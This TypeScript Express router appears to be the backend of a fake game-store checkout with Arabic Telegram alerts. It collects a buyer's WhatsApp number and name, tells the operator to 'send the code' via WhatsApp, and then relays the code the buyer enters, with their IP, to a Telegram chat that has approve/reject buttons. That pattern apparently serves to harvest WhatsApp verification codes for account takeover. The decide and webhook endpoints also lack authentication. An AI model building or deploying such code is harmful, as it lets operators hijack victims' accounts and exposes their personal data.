import { Router, type IRouter } from "express";
import { db, ordersTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { randomUUID } from "crypto";
import {
  CreateOrderBody,
  SubmitContactBody,
  SubmitCodeBody,
  DecideOrderBody,
} from "@workspace/api-zod";
import { sendTelegramMessage, answerCallbackQuery } from "../lib/telegram";

const router: IRouter = Router();

router.post("/orders", async (req, res) => {
  try {
    const body = CreateOrderBody.parse(req.body);
    const id = randomUUID().slice(0, 8).toUpperCase();
    const ipAddress =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.ip ||
      "unknown";

    const [order] = await db
      .insert(ordersTable)
      .values({
        id,
        productId: body.productId,
        productName: body.productName,
        price: body.price,
        quantity: body.quantity,
        status: "pending",
        ipAddress,
      })
      .returning();

    await sendTelegramMessage(
      `🛒 <b>طلب جديد</b>\n\n` +
        `📋 رقم الطلب: <code>${id}</code>\n` +
        `🎮 المنتج: ${body.productName}\n` +
        `💰 السعر: $${body.price}\n` +
        `📦 الكمية: ${body.quantity}\n` +
        `🌐 IP: ${ipAddress}\n` +
        `⏰ الحالة: في انتظار معلومات التواصل`
    );

    res.status(201).json(order);
  } catch (err: any) {
    req.log.error({ err }, "Error creating order");
    res.status(400).json({ error: err.message });
  }
});

router.post("/orders/:orderId/contact", async (req, res) => {
  try {
    const { orderId } = req.params;
    const body = SubmitContactBody.parse(req.body);

    const [order] = await db
      .update(ordersTable)
      .set({
        whatsapp: body.whatsapp,
        name: body.name || null,
        status: "contact_submitted",
      })
      .where(eq(ordersTable.id, orderId))
      .returning();

    if (!order) {
      res.status(404).json({ error: "Order not found" });
      return;
    }

    await sendTelegramMessage(
      `📱 <b>معلومات التواصل</b>\n\n` +
        `📋 رقم الطلب: <code>${orderId}</code>\n` +
        `📞 واتساب: ${body.whatsapp}\n` +
        `👤 الاسم: ${body.name || "غير محدد"}\n` +
        `🎮 المنتج: ${order.productName}\n` +
        `💰 السعر: $${order.price}\n` +
        `🌐 IP: ${order.ipAddress}\n\n` +
        `⏳ في انتظار إرسال الكود للعميل عبر واتساب`
    );

    res.json(order);
  } catch (err: any) {
    req.log.error({ err }, "Error submitting contact");
    res.status(400).json({ error: err.message });
  }
});

router.post("/orders/:orderId/code", async (req, res) => {
  try {
    const { orderId } = req.params;
    const body = SubmitCodeBody.parse(req.body);

    const [order] = await db
      .update(ordersTable)
      .set({
        code: body.code,
        status: "code_submitted",
      })
      .where(eq(ordersTable.id, orderId))
      .returning();

    if (!order) {
      res.status(404).json({ error: "Order not found" });
      return;
    }

    await sendTelegramMessage(
      `🔑 <b>تم إدخال الكود</b>\n\n` +
        `📋 رقم الطلب: <code>${orderId}</code>\n` +
        `🔐 الكود: <code>${body.code}</code>\n` +
        `📞 واتساب: ${order.whatsapp}\n` +
        `👤 الاسم: ${order.name || "غير محدد"}\n` +
        `🎮 المنتج: ${order.productName}\n` +
        `💰 السعر: $${order.price}\n` +
        `🌐 IP: ${order.ipAddress}`,
      [
        [
          { text: "✅ موافقة", callback_data: `approve_${orderId}` },
          { text: "❌ رفض", callback_data: `reject_${orderId}` },
        ],
      ]
    );

    res.json(order);
  } catch (err: any) {
    req.log.error({ err }, "Error submitting code");
    res.status(400).json({ error: err.message });
  }
});

router.get("/orders/:orderId/status", async (req, res) => {
  try {
    const { orderId } = req.params;
    const [order] = await db
      .select()
      .from(ordersTable)
      .where(eq(ordersTable.id, orderId));

    if (!order) {
      res.status(404).json({ error: "Order not found" });
      return;
    }

    res.json(order);
  } catch (err: any) {
    req.log.error({ err }, "Error getting order status");
    res.status(400).json({ error: err.message });
  }
});

router.post("/orders/:orderId/decide", async (req, res) => {
  try {
    const { orderId } = req.params;
    const body = DecideOrderBody.parse(req.body);

    const [order] = await db
      .update(ordersTable)
      .set({ status: body.decision })
      .where(eq(ordersTable.id, orderId))
      .returning();

    if (!order) {
      res.status(404).json({ error: "Order not found" });
      return;
    }

    res.json(order);
  } catch (err: any) {
    req.log.error({ err }, "Error deciding order");
    res.status(400).json({ error: err.message });
  }
});

router.post("/telegram/webhook", async (req, res) => {
  try {
    const update = req.body;

    if (update.callback_query) {
      const callbackData = update.callback_query.data as string;
      const callbackQueryId = update.callback_query.id;

      if (callbackData.startsWith("approve_") || callbackData.startsWith("reject_")) {
        const parts = callbackData.split("_");
        const action = parts[0];
        const orderId = parts.slice(1).join("_");
        const decision = action === "approve" ? "approved" : "rejected";

        const [order] = await db
          .update(ordersTable)
          .set({ status: decision })
          .where(eq(ordersTable.id, orderId))
          .returning();

        if (order) {
          const statusText =
            decision === "approved"
              ? `✅ تمت الموافقة على الطلب <code>${orderId}</code>`
              : `❌ تم رفض الطلب <code>${orderId}</code>`;

          await sendTelegramMessage(statusText);
          await answerCallbackQuery(
            callbackQueryId,
            decision === "approved" ? "تمت الموافقة" : "تم الرفض"
          );
        }
      }
    }

    res.json({ ok: true });
  } catch (err: any) {
    req.log.error({ err }, "Error processing telegram webhook");
    res.json({ ok: true });
  }
});

export default router;
